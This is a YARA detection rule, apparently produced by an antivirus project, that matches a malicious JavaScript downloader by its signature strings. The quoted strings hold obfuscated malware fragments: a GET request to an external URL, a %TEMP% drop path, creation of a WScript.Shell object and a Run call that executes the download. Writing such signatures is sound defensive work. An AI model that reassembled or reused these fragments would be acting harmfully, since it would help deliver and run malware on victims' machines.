rule sig_20160427_9ef7f3b8473ca4079f29fb65bf26ec1a {
  meta:
    description = "datamaliciousorder - file 20160427_9ef7f3b8473ca4079f29fb65bf26ec1a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4ec296488e0ab7a537898025d322252024ac8954e833eb3cec3a3e1308a782c9"

  strings:
    $s1  = "WokefPjanh[GhaytSuvba](\"G\" + \"ET\", \"http://onlinecrockpotrecipes.com/k2tspa\", false);" fullword ascii
    $s2  = "function YjbfrRjuly() {return CvsjcZsgiv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"JfXQiD4" ascii
    $s3  = "function YjbfrRjuly() {return CvsjcZsgiv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"JfXQiD4" ascii
    $s4  = "function KcesuJfhwy(XkuanPgqut, NtysnJumen){ZmfbxTitie = ZmfbxTitie * 1; return XkuanPgqut - NtysnJumen;};" fullword ascii
    $s5  = "var CvsjcZsgiv = function JkukjGhxqd() {return UlwgyQubwc[BuoeuTeucd](\"WScript\"+\".Shell\");}(), LauuqLgytd = 11;" fullword ascii
    $s6  = "var UlwgyQubwc = this[\"WScript\"];" fullword ascii
    $s7  = "if (WokefPjanh[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function XcromSlppl(){return XkncnRrphd + \"\";};" fullword ascii
    $s9  = "return KcesuJfhwy(TxvwqJwhku, HcmdrZzdyu);" fullword ascii
    $s10 = "function DpvcgBjitz() {return ((LbbqrMwgnm == true) && (LbbqrMwgnm == OpqloEjekl)) ? 1 : ZmfbxTitie;};" fullword ascii
    $s11 = "var VbzaoKtpks = new this[\"D\"+\"ate\"]();" fullword ascii
    $s12 = "var AsodfQpbfu = false;" fullword ascii
    $s13 = "function XzdqwSlfbs(){return 23;};" fullword ascii
    $s14 = "var OpqloEjekl = false;" fullword ascii
    $s15 = "OpqloEjekl = true; " fullword ascii
    $s16 = "LbbqrMwgnm = true; " fullword ascii
    $s17 = "function FfsnxGdrzg(VpgkcWxcuj) {var VsnfzMpqva = (1, 2, 3, 4, 5, VpgkcWxcuj); return VsnfzMpqva;};" fullword ascii
    $s18 = "AsodfQpbfu = true;" fullword ascii
    $s19 = "var LbbqrMwgnm = false;" fullword ascii
    $s20 = "function MxqbtRjcqh(LpmuyQyfbp){CvsjcZsgiv[\"R\"+\"un\"](LpmuyQyfbp, ZmfbxTitie, ZmfbxTitie);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}